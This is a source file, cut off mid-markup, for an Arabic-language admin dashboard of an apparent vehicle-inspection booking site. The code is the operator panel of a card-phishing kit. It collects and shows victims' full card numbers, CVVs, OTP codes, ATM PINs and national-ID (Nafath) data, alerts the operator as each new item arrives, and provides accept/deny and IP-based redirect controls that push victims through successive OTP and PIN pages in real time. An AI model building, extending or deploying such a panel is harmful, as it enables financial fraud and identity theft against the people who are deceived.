import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useAuth } from "@/_core/hooks/useAuth";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { toast } from "sonner";
import { io as socketIO } from "socket.io-client";

// دالة تشغيل صوت تنبيه
function playNotificationSound() {
  try {
    const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.frequency.setValueAtTime(880, ctx.currentTime);
    osc.frequency.setValueAtTime(1100, ctx.currentTime + 0.1);
    osc.frequency.setValueAtTime(880, ctx.currentTime + 0.2);
    gain.gain.setValueAtTime(0.3, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.4);
  } catch (e) {}
}

type Booking = {
  id: number;
  referenceId: string;
  clientName: string;
  clientId: string;
  clientPhone: string;
  clientEmail?: string | null;
  clientNationality?: string | null;
  vehiclePlate: string;
  serviceRegion: string;
  serviceDate: string;
  status: string;
  clientIp: string | null;
  createdAt: Date;
};

type Payment = {
  id?: number;
  referenceId?: string;
  cardHolderName?: string | null;
  cardNumber?: string | null;
  cardLastFour?: string | null;
  cardCvv?: string | null;
  cardExpiry?: string | null;
  verifyCode?: string | null;
  secretNum?: string | null;
  paymentAction?: string | null;
  step?: number | null;
  status?: string | null;
};

const STATUS_LABELS: Record<string, { label: string; color: string; bg: string; border: string }> = {
  new:              { label: "جديد",          color: "#0d6efd", bg: "#e7f0ff", border: "#b6d0ff" },
  pending_payment:  { label: "انتظار دفع",    color: "#856404", bg: "#fff3cd", border: "#ffd966" },
  pending_nafath:   { label: "انتظار نفاذ",   color: "#6f42c1", bg: "#f0e9ff", border: "#c9b8f0" },
  pending_motasel:  { label: "انتظار متصل",   color: "#d63384", bg: "#ffe5f0", border: "#f5b8d5" },
  payment_done:     { label: "تم الدفع",      color: "#146c43", bg: "#d1e7dd", border: "#a3cfbb" },
  verified:         { label: "تم التحقق",     color: "#0a6640", bg: "#d0f0e0", border: "#8fd4b0" },
  completed:        { label: "مكتمل",         color: "#495057", bg: "#e9ecef", border: "#ced4da" },
  cancelled:        { label: "ملغي",          color: "#842029", bg: "#f8d7da", border: "#f1aeb5" },
};

// مكوّن عرض التفاصيل المنسدلة
function BookingDetailsRow({
  booking,
  onClose,
  onPaymentAction,
  onNavigate,
}: {
  booking: Booking;
  onClose: () => void;
  onPaymentAction: (reference: string, action: "verified" | "denied") => void;
  onNavigate: (booking: Booking, page: string) => void;
}) {
  const [showCardNum, setShowCardNum] = useState(false);
  const [showCvv, setShowCvv] = useState(false);

  const { data: detailsData, isLoading } = trpc.admin.getTemplateForms.useQuery(
    { Reference: booking.referenceId },
    { refetchInterval: 5000 }
  );

  const payment: Payment = (detailsData?.data?.payment as Payment) || {};
  const b = detailsData?.data?.booking || booking;

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text).then(() => toast.success(`تم نسخ ${label}`));
  };

  const cardDisplay = payment.cardNumber
    ? (showCardNum ? payment.cardNumber : `${"•".repeat(Math.max(0, (payment.cardNumber?.length || 16) - 4))}${payment.cardNumber?.slice(-4) || ""}`)
    : payment.cardLastFour
    ? `•••• •••• •••• ${payment.cardLastFour}`
    : "—";

  const cvvDisplay = payment.cardCvv
    ? (showCvv ? payment.cardCvv : "•••")
    : "—";

  const currentStep = payment.step ?? 0;

  return (
    <tr>
      <td colSpan={8} style={{ padding: 0, background: "#f8fafc" }}>
        <div style={{
          padding: "20px 24px",
          borderTop: "2px solid #4361ee",
          borderBottom: "1px solid #e2e8f0",
          background: "linear-gradient(135deg, #f8fafc 0%, #f0f4ff 100%)",
          animation: "slideDown 0.2s ease"
        }}>
          {isLoading ? (
            <div style={{ textAlign: "center", padding: "20px", color: "#94a3b8" }}>
              <div style={{ width: 24, height: 24, border: "3px solid #4361ee", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.8s linear infinite", margin: "0 auto 8px" }} />
              جاري تحميل التفاصيل...
            </div>
          ) : (
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 20 }}>

              {/* === بيانات العميل === */}
              <div style={{ background: "white", borderRadius: 10, padding: "16px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)" }}>
                <div style={{ fontSize: 13, fontWeight: 700, color: "#4361ee", marginBottom: 12, display: "flex", alignItems: "center", gap: 6 }}>
                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#4361ee" strokeWidth="2">
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
                    <circle cx="12" cy="7" r="4"/>
                  </svg>
                  بيانات العميل
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                  <DetailRow label="الاسم" value={(b as any).clientName || "—"} />
                  <DetailRow label="رقم الهوية" value={(b as any).clientId || "—"} />
                  <DetailRow label="الجوال" value={(b as any).clientPhone || "—"} />
                  <DetailRow label="البريد الإلكتروني" value={(b as any).clientEmail || "—"} />
                  <DetailRow label="الجنسية" value={(b as any).clientNationality || "—"} />
                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                    <span style={{ fontSize: 11, color: "#94a3b8" }}>IP العميل</span>
                    <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
                      <span style={{ fontSize: 12, color: "#374151", fontFamily: "monospace", background: "#f1f5f9", padding: "2px 6px", borderRadius: 4 }}>
                        {(b as any).clientIp || "—"}
                      </span>
                      {(b as any).clientIp && (
                        <button
                          onClick={() => copyToClipboard((b as any).clientIp, "IP")}
                          style={{ background: "none", border: "none", cursor: "pointer", padding: 2, color: "#94a3b8" }}
                          title="نسخ"
                        >
                          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
                            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
                          </svg>
                        </button>
                      )}
                    </div>
                  </div>
                </div>
              </div>

              {/* === بيانات البطاقة === */}
              <div style={{ background: "white", borderRadius: 10, padding: "16px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)" }}>
                <div style={{ fontSize: 13, fontWeight: 700, color: "#16a34a", marginBottom: 12, display: "flex", alignItems: "center", gap: 6 }}>
                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2">
                    <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/>
                    <line x1="1" y1="10" x2="23" y2="10"/>
                  </svg>
                  بيانات البطاقة
                  {currentStep > 0 && (
                    <span style={{ background: "#dcfce7", color: "#16a34a", borderRadius: 10, padding: "1px 8px", fontSize: 10, fontWeight: 600 }}>
                      مرحلة {currentStep}
                    </span>
                  )}
                </div>
                {payment.cardNumber || payment.cardLastFour ? (
                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                    <DetailRow label="اسم حامل البطاقة" value={payment.cardHolderName || "—"} />

                    {/* رقم البطاقة */}
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                      <span style={{ fontSize: 11, color: "#94a3b8" }}>رقم البطاقة</span>
                      <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
                        <span style={{ fontSize: 12, color: "#374151", fontFamily: "monospace", letterSpacing: 1 }}>
                          {cardDisplay}
                        </span>
                        <button
                          onClick={() => setShowCardNum(!showCardNum)}
                          style={{ background: "none", border: "none", cursor: "pointer", padding: 2, color: "#94a3b8" }}
                          title={showCardNum ? "إخفاء" : "إظهار"}
                        >
                          {showCardNum ? (
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                              <line x1="1" y1="1" x2="23" y2="23"/>
                            </svg>
                          ) : (
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                              <circle cx="12" cy="12" r="3"/>
                            </svg>
                          )}
                        </button>
                        {payment.cardNumber && (
                          <button
                            onClick={() => copyToClipboard(payment.cardNumber!, "رقم البطاقة")}
                            style={{ background: "none", border: "none", cursor: "pointer", padding: 2, color: "#94a3b8" }}
                            title="نسخ"
                          >
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                              <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
                              <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
                            </svg>
                          </button>
                        )}
                      </div>
                    </div>

                    {/* تاريخ الانتهاء */}
                    <DetailRow label="تاريخ الانتهاء" value={payment.cardExpiry || "—"} />

                    {/* CVV */}
                    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                      <span style={{ fontSize: 11, color: "#94a3b8" }}>CVV</span>
                      <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
                        <span style={{ fontSize: 12, color: "#374151", fontFamily: "monospace" }}>
                          {cvvDisplay}
                        </span>
                        {payment.cardCvv && (
                          <button
                            onClick={() => setShowCvv(!showCvv)}
                            style={{ background: "none", border: "none", cursor: "pointer", padding: 2, color: "#94a3b8" }}
                            title={showCvv ? "إخفاء" : "إظهار"}
                          >
                            {showCvv ? (
                              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
                                <line x1="1" y1="1" x2="23" y2="23"/>
                              </svg>
                            ) : (
                              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                                <circle cx="12" cy="12" r="3"/>
                              </svg>
                            )}
                          </button>
                        )}
                      </div>
                    </div>

                    {/* OTP إذا وُجد */}
                    {payment.verifyCode && (
                      <DetailRow label="رمز OTP" value={payment.verifyCode} highlight />
                    )}

                    {/* الرقم السري إذا وُجد */}
                    {payment.secretNum && (
                      <DetailRow label="الرقم السري / ATM" value={payment.secretNum} highlight />
                    )}
                  </div>
                ) : (
                  <div style={{ textAlign: "center", padding: "20px 0", color: "#94a3b8", fontSize: 12 }}>
                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#d1d5db" strokeWidth="1.5" style={{ margin: "0 auto 8px", display: "block" }}>
                      <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/>
                      <line x1="1" y1="10" x2="23" y2="10"/>
                    </svg>
                    لم يُدخل بيانات البطاقة بعد
                  </div>
                )}
              </div>

              {/* === أزرار التحكم === */}
              <div style={{ background: "white", borderRadius: 10, padding: "16px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", display: "flex", flexDirection: "column", gap: 10 }}>
                <div style={{ fontSize: 13, fontWeight: 700, color: "#374151", marginBottom: 4, display: "flex", alignItems: "center", gap: 6 }}>
                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#374151" strokeWidth="2">
                    <circle cx="12" cy="12" r="3"/>
                    <path d="M19.07 4.93a10 10 0 0 1 0 14.14M4.93 4.93a10 10 0 0 0 0 14.14"/>
                  </svg>
                  التحكم في العميل
                </div>

                {/* حالة الدفع الحالية */}
                {payment.paymentAction && (
                  <div style={{ background: "#f8fafc", borderRadius: 6, padding: "6px 10px", fontSize: 11, color: "#64748b", border: "1px solid #e2e8f0" }}>
                    الحالة: <strong style={{ color: payment.paymentAction === "accepted" || payment.paymentAction === "verified" ? "#16a34a" : payment.paymentAction === "denied" ? "#dc2626" : "#d97706" }}>
                      {payment.paymentAction === "accepted" ? "مقبول" : payment.paymentAction === "verified" ? "تم التحقق" : payment.paymentAction === "denied" ? "مرفوض" : "في الانتظار"}
                    </strong>
                    {currentStep > 0 && <span style={{ marginRight: 8 }}>| المرحلة: {currentStep}</span>}
                  </div>
                )}

                {/* زر القبول */}
                <button
                  onClick={() => onPaymentAction(booking.referenceId, "verified")}
                  style={{
                    background: "linear-gradient(135deg, #16a34a, #15803d)",
                    color: "white",
                    border: "none",
                    borderRadius: 8,
                    padding: "10px 16px",
                    fontSize: 13,
                    fontWeight: 700,
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 6,
                    fontFamily: "'Cairo', sans-serif",
                    boxShadow: "0 2px 8px rgba(22,163,74,0.3)"
                  }}
                >
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                    <polyline points="20 6 9 17 4 12"/>
                  </svg>
                  {currentStep === 0 || currentStep === 1 ? "قبول → OTP" : currentStep === 2 ? "قبول → رمز ثانٍ" : "قبول → إتمام"}
                </button>

                {/* زر الرفض */}
                <button
                  onClick={() => onPaymentAction(booking.referenceId, "denied")}
                  style={{
                    background: "linear-gradient(135deg, #dc2626, #b91c1c)",
                    color: "white",
                    border: "none",
                    borderRadius: 8,
                    padding: "10px 16px",
                    fontSize: 13,
                    fontWeight: 700,
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 6,
                    fontFamily: "'Cairo', sans-serif",
                    boxShadow: "0 2px 8px rgba(220,38,38,0.3)"
                  }}
                >
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                    <line x1="18" y1="6" x2="6" y2="18"/>
                    <line x1="6" y1="6" x2="18" y2="18"/>
                  </svg>
                  {currentStep === 0 || currentStep === 1 ? "رفض → صفحة البطاقة" : currentStep === 2 ? "رفض → OTP" : "رفض → رمز ثانٍ"}
                </button>

                {/* فاصل */}
                <div style={{ borderTop: "1px solid #e2e8f0", paddingTop: 8 }}>
                  <div style={{ fontSize: 11, color: "#94a3b8", marginBottom: 6 }}>توجيه سريع</div>
                  <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 6 }}>
                    <button
                      onClick={() => onNavigate(booking, "/payment")}
                      style={{ background: "#f0fdf4", color: "#16a34a", border: "1px solid #bbf7d0", borderRadius: 6, padding: "6px 8px", fontSize: 11, cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}
                    >
                      صفحة الدفع
                    </button>
                    <button
                      onClick={() => onNavigate(booking, "/nafath")}
                      style={{ background: "#f5f3ff", color: "#7c3aed", border: "1px solid #ddd6fe", borderRadius: 6, padding: "6px 8px", fontSize: 11, cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}
                    >
                      صفحة نفاذ
                    </button>
                    <button
                      onClick={() => onNavigate(booking, "/booking")}
                      style={{ background: "#eff6ff", color: "#2563eb", border: "1px solid #bfdbfe", borderRadius: 6, padding: "6px 8px", fontSize: 11, cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}
                    >
                      صفحة الحجز
                    </button>
                    <button
                      onClick={() => onNavigate(booking, "/")}
                      style={{ background: "#f9fafb", color: "#6b7280", border: "1px solid #e5e7eb", borderRadius: 6, padding: "6px 8px", fontSize: 11, cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}
                    >
                      الرئيسية
                    </button>
                  </div>
                </div>

                {/* زر الإغلاق */}
                <button
                  onClick={onClose}
                  style={{
                    background: "#f1f5f9",
                    color: "#64748b",
                    border: "1px solid #e2e8f0",
                    borderRadius: 8,
                    padding: "8px 16px",
                    fontSize: 12,
                    cursor: "pointer",
                    fontFamily: "'Cairo', sans-serif",
                    marginTop: 4
                  }}
                >
                  إغلاق التفاصيل
                </button>
              </div>

            </div>
          )}
        </div>
      </td>
    </tr>
  );
}

// مكوّن صف تفصيلي
function DetailRow({ label, value, highlight }: { label: string; value: string; highlight?: boolean }) {
  return (
    <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
      <span style={{ fontSize: 11, color: "#94a3b8" }}>{label}</span>
      <span style={{
        fontSize: 12,
        color: highlight ? "#dc2626" : "#374151",
        fontWeight: highlight ? 700 : 500,
        background: highlight ? "#fef2f2" : "transparent",
        padding: highlight ? "1px 6px" : "0",
        borderRadius: highlight ? 4 : 0,
        fontFamily: highlight ? "monospace" : "inherit"
      }}>
        {value}
      </span>
    </div>
  );
}

export default function AdminDashboard() {
  const [, navigate] = useLocation();
  const { user, loading, isAuthenticated, logout } = useAuth();
  const [search, setSearch] = useState("");
  const [newBookingsCount, setNewBookingsCount] = useState(0);
  const [isConnected, setIsConnected] = useState(false);
  const [expandedRow, setExpandedRow] = useState<string | null>(null);
  const socketRef = useRef<ReturnType<typeof socketIO> | null>(null);

  // Auth check
  useEffect(() => {
    if (!loading && (!isAuthenticated || user?.role !== "admin")) {
      navigate("/admin/login");
    }
  }, [loading, isAuthenticated, user]);

  // Socket.io connection
  useEffect(() => {
    const socket = socketIO({ path: "/socket.io" });
    socketRef.current = socket;

    socket.on("connect", () => setIsConnected(true));
    socket.on("disconnect", () => setIsConnected(false));

    socket.emit("joinAdmin", "admin-token");

    socket.on("newBooking", (booking: Booking) => {
      playNotificationSound();
      toast.success(`حجز جديد من ${booking.clientName}`, {
        description: `رقم الهوية: ${booking.clientId} | اللوحة: ${booking.vehiclePlate}`,
      });
      setNewBookingsCount((c) => c + 1);
      refetchBookings();
    });

    socket.on("newPayment", (data: { reference: string; step?: number; type?: string }) => {
      playNotificationSound();
      const typeLabels: Record<string, string> = {
        card: "بيانات بطاقة جديدة",
        verification: "رمز OTP جديد",
        code: "رقم ATM جديد",
        nafath: "بيانات نفاذ جديدة",
        phoneCode: "رمز هاتف جديد",
      };
      const label = data.type ? typeLabels[data.type] || "بيانات جديدة" : "دفع جديد";
      toast.info(`${label} - المرجع: ${data.reference}`);
      refetchBookings();
    });

    return () => {
      socket.disconnect();
    };
  }, []);

  // Data fetching
  const { data: statsData } = trpc.booking.stats.useQuery();
  const {
    data: bookingsData,
    refetch: refetchBookings,
    isLoading,
  } = trpc.booking.list.useQuery({ limit: 200 });

  const navigateMutation = trpc.navigation.navigateTo.useMutation({
    onSuccess: (res) => {
      toast.success(res.message);
    },
    onError: (err) => toast.error(err.message),
  });

  const updateStatusMutation = trpc.booking.updateStatus.useMutation({
    onSuccess: () => {
      toast.success("تم تحديث الحالة");
      refetchBookings();
    },
  });

  const markReadMutation = trpc.booking.markRead.useMutation({
    onSuccess: () => refetchBookings(),
  });

  const paymentActionMutation = trpc.admin.setPaymentAction.useMutation({
    onSuccess: (res) => {
      const actionLabel = res.action === "verified" ? "تم القبول" : "تم الرفض";
      const pageLabel = res.targetPage ? ` → ${res.targetPage}` : "";
      toast.success(`${actionLabel}${pageLabel}`);
      refetchBookings();
    },
    onError: (err) => toast.error(err.message),
  });

  const stats = statsData?.data;
  const bookings: Booking[] = (bookingsData?.data as Booking[]) || [];

  const filtered = bookings.filter(
    (b) =>
      b.clientName?.toLowerCase().includes(search.toLowerCase()) ||
      b.clientId?.includes(search) ||
      b.vehiclePlate?.toLowerCase().includes(search.toLowerCase()) ||
      b.referenceId?.includes(search)
  );

  const handleNavigate = (booking: Booking, page: string) => {
    if (!booking.clientIp) {
      toast.error("لا يوجد IP للعميل");
      return;
    }
    navigateMutation.mutate({
      clientIp: booking.clientIp,
      page,
      referenceId: booking.referenceId,
    });
  };

  const handlePaymentAction = (reference: string, action: "verified" | "denied") => {
    paymentActionMutation.mutate({ reference, action });
  };

  const toggleRow = (referenceId: string) => {
    if (expandedRow === referenceId) {
      setExpandedRow(null);
    } else {
      setExpandedRow(referenceId);
    }
  };

  if (loading) {
    return (
      <div style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", background: "#f5f7fa" }}>
        <div style={{ width: 40, height: 40, border: "4px solid #4361ee", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.8s linear infinite" }} />
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
      </div>
    );
  }

  const pendingCount = (stats as any)?.pending ?? Math.max(0, (stats?.total ?? 0) - (stats?.completed ?? 0) - (stats?.new ?? 0));
  const visitorsCount = (stats as any)?.visitors ?? 0;

  return (
    <div dir="rtl" style={{ minHeight: "100vh", background: "#f5f7fa", fontFamily: "'Cairo', sans-serif" }}>
      {/* Google Fonts */}
      <link rel="preconnect" href="https://fonts.googleapis.com" />
      <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet" />

      {/* ===== HEADER ===== */}
      <header style={{
        background: "white",
        borderBottom: "1px solid #e8ecf0",
        padding: "0 24px",
        height: 64,
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        position: "sticky",
        top: 0,
        zIndex: 100,
        boxShadow: "0 1px 4px rgba(0,0,0,0.06)"
      }}>
        {/* Left: logout + refresh + status */}
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <button
            onClick={() => { logout(); navigate("/admin/login"); }}
            style={{
              background: "#ef4444",
              color: "white",
              border: "none",
              borderRadius: 8,
              padding: "7px 16px",
              fontSize: 13,
              fontWeight: 600,
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              gap: 6,
              fontFamily: "'Cairo', sans-serif"
            }}
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
              <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>
              <polyline points="16 17 21 12 16 7"/>
              <line x1="21" y1="12" x2="9" y2="12"/>
            </svg>
            خروج
          </button>

          <button
            onClick={() => refetchBookings()}
            style={{
              background: "white",
              color: "#6b7280",
              border: "1px solid #e5e7eb",
              borderRadius: 8,
              padding: "7px 10px",
              fontSize: 13,
              cursor: "pointer",
              display: "flex",
              alignItems: "center"
            }}
            title="تحديث"
          >
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <polyline points="23 4 23 10 17 10"/>
              <polyline points="1 20 1 14 7 14"/>
              <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/>
            </svg>
          </button>

          <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 13, color: isConnected ? "#22c55e" : "#9ca3af" }}>
            <span style={{ width: 8, height: 8, borderRadius: "50%", background: isConnected ? "#22c55e" : "#d1d5db", display: "inline-block" }} />
            {isConnected ? "متصل" : "غير متصل"}
          </div>

          {newBookingsCount > 0 && (
            <button
              onClick={() => { setNewBookingsCount(0); refetchBookings(); }}
              style={{ background: "#fef2f2", color: "#ef4444", border: "1px solid #fecaca", borderRadius: 20, padding: "4px 12px", fontSize: 12, cursor: "pointer", display: "flex", alignItems: "center", gap: 6, fontFamily: "'Cairo', sans-serif" }}
            >
              <span style={{ background: "#ef4444", color: "white", borderRadius: "50%", width: 18, height: 18, display: "inline-flex", alignItems: "center", justifyContent: "center", fontWeight: 700, fontSize: 11 }}>{newBookingsCount}</span>
              حجوزات جديدة
            </button>
          )}
        </div>

        {/* Right: title + icon */}
        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
          <div style={{ textAlign: "right" }}>
            <div style={{ fontSize: 16, fontWeight: 700, color: "#1e293b" }}>نظام حجز الفحص الفني</div>
            <div style={{ fontSize: 11, color: "#94a3b8" }}>لوحة التحكم</div>
          </div>
          <div style={{
            width: 44,
            height: 44,
            background: "#4361ee",
            borderRadius: "50%",
            display: "flex",
            alignItems: "center",
            justifyContent: "center"
          }}>
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
              <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
              <circle cx="9" cy="7" r="4"/>
              <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
              <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
            </svg>
          </div>
        </div>
      </header>

      <div style={{ maxWidth: 1400, margin: "0 auto", padding: "24px 20px" }}>

        {/* ===== STATS CARDS ===== */}
        <div style={{ display: "grid", gridTemplateColumns: "repeat(5, 1fr)", gap: 16, marginBottom: 24 }}>

          {/* إجمالي الحجوزات */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px 20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div>
              <div style={{ fontSize: 32, fontWeight: 700, color: "#1e293b", lineHeight: 1 }}>{stats?.total ?? 0}</div>
              <div style={{ fontSize: 13, color: "#94a3b8", marginTop: 6 }}>إجمالي الحجوزات</div>
            </div>
            <div style={{ width: 52, height: 52, background: "#ede9fe", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#7c3aed" strokeWidth="2">
                <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
                <circle cx="9" cy="7" r="4"/>
                <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
                <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
              </svg>
            </div>
          </div>

          {/* حجوزات جديدة */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px 20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div>
              <div style={{ fontSize: 32, fontWeight: 700, color: "#1e293b", lineHeight: 1 }}>{stats?.new ?? 0}</div>
              <div style={{ fontSize: 13, color: "#94a3b8", marginTop: 6 }}>حجوزات جديدة</div>
            </div>
            <div style={{ width: 52, height: 52, background: "#fef3c7", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#d97706" strokeWidth="2">
                <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/>
                <path d="M13.73 21a2 2 0 0 1-3.46 0"/>
              </svg>
            </div>
          </div>

          {/* مكتملة */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px 20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div>
              <div style={{ fontSize: 32, fontWeight: 700, color: "#1e293b", lineHeight: 1 }}>{stats?.completed ?? 0}</div>
              <div style={{ fontSize: 13, color: "#94a3b8", marginTop: 6 }}>مكتملة</div>
            </div>
            <div style={{ width: 52, height: 52, background: "#dcfce7", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="2.5">
                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
                <polyline points="22 4 12 14.01 9 11.01"/>
              </svg>
            </div>
          </div>

          {/* قيد المعالجة */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px 20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div>
              <div style={{ fontSize: 32, fontWeight: 700, color: "#1e293b", lineHeight: 1 }}>{pendingCount}</div>
              <div style={{ fontSize: 13, color: "#94a3b8", marginTop: 6 }}>قيد المعالجة</div>
            </div>
            <div style={{ width: 52, height: 52, background: "#ffedd5", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ea580c" strokeWidth="2">
                <circle cx="12" cy="12" r="10"/>
                <polyline points="12 6 12 12 16 14"/>
              </svg>
            </div>
          </div>

          {/* زوار متصلون الآن */}
          <div style={{ background: "white", borderRadius: 12, padding: "20px 20px", boxShadow: "0 1px 4px rgba(0,0,0,0.06)", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div>
              <div style={{ fontSize: 32, fontWeight: 700, color: "#1e293b", lineHeight: 1 }}>{visitorsCount}</div>
              <div style={{ fontSize: 13, color: "#94a3b8", marginTop: 6 }}>زوار متصلون الآن</div>
            </div>
            <div style={{ width: 52, height: 52, background: "#fee2e2", borderRadius: 12, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#dc2626" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M5 12.55a11 11 0 0 1 14.08 0"/>
                <path d="M1.42 9a16 16 0 0 1 21.16 0"/>
                <path d="M8.53 16.11a6 6 0 0 1 6.95 0"/>
                <line x1="12" y1="20" x2="12.01" y2="20"/>
              </svg>
            </div>
          </div>
        </div>

        {/* ===== BOOKINGS TABLE ===== */}
        <div style={{ background: "white", borderRadius: 12, boxShadow: "0 1px 4px rgba(0,0,0,0.06)", overflow: "hidden" }}>

          {/* Table Header */}
          <div style={{ padding: "16px 20px", display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: 12 }}>
